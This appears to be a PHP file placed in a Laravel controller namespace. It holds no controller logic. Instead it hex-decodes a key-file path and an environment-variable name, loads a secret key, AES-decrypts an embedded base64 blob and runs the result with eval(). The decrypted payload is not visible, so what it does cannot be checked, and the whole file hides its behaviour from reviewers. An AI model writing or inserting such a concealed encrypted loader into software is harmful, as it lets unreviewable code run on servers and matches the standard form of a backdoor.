<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('p22Cu6CbL11l0DZpceymwQ==');

$c=base64_decode(

'AzK2d0tqz/Nl85QIRCT5nmXKAXh1YgwL2ik6pseH2v+L/9m3mdWh9d13jfsOyxEoswhPRAvs1DkM' .
'ma6oZR50DjYz5VL02g6mwYFlOT6fSMoHLpTgAzGVr01NGk3CFFnQqnCDmBz+p+quK4GMrF3JoJMo' .
'QX6EHWyceI5J6HEvgVsaff6BMhwOXXQm5JpTKLsXpQjx2Tt4ZJboK35IZKiVlcHamTO/AfE3OZeg' .
'rdbf/vxSZ66yPvF+weibSFK2NUFL'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

